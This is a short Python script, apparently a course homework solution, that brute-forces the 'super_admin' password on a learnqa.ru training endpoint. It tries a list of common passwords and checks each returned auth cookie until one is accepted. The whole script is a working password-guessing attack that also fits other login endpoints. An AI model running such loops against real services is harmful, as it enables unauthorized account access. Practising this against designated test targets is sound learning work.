import requests

passwords = ["password", "123456", "12345678", "qwerty", "abc123", "monkey", "1234567",
             "letmein","trustno1", "dragon", "baseball", "111111", "iloveyou", "master",
             "sunshine", "ashley", "bailey", "passw0rd", "shadow", "123123", "654321",
             "superman", "qazwsx", "michael", "Football", "welcome", "jesus", "ninja",
             "mustang", "password1", "123456789", "adobe123", "admin", "1234567890",
             "photoshop", "1234", "12345", "princess", "azerty", "000000", "access",
             "696969", "batman", "solo", "starwars", "flower", "hottie", "loveme",
             "zaq1zaq1", "hello", "freedom", "whatever", "666666", "!@#$%^&*",
             "charlie", "aa123456", "donald", "qwerty123","1q2w3e4r", "555555",
             "lovely", "7777777", "888888", "123qwe"]

login = "super_admin"
url_get_password = "https://playground.learnqa.ru/ajax/api/get_secret_password_homework"
url_check_auth_cookie = "https://playground.learnqa.ru/ajax/api/check_auth_cookie"


for password in passwords:
    get_password = requests.post(url_get_password, data={"login": login, "password": password})
    auth_cookies = get_password.cookies["auth_cookie"]
    check_cookie = requests.post(url_check_auth_cookie, cookies={"auth_cookie": auth_cookies})
    if check_cookie.text == "You are authorized":
        print(f"Верный пароль: {password}")
        print(f"Получаемый текст при верном пароле: {check_cookie.text}")
        break













